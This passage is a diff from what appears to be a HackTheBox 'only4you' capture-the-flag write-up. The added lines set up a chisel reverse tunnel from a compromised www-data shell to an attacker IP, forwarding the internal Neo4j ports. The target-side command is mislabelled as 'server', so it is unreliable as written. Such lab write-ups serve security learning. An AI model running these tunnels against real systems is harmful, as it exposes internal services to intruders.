@@ -159,4 +159,10 @@ Now that we have access, we will need to go back to the etc./passwd file to noti
 > neo4j  | HTTP | 7474 |  server.http.listen_address
 >        | Bolt | 7687 |  server.bolt.listen.address
 
+Attack Box
+└─$ ./chisel server -p 9999 --reverse
 
+
+TArget Box 
+
+www-data@only4you:~/only4you.htb/tmp$ chisel server 10.10.14.25:9999 R:7687:0.0.0.0:7687 R:7474:127.0.0.1:7474  
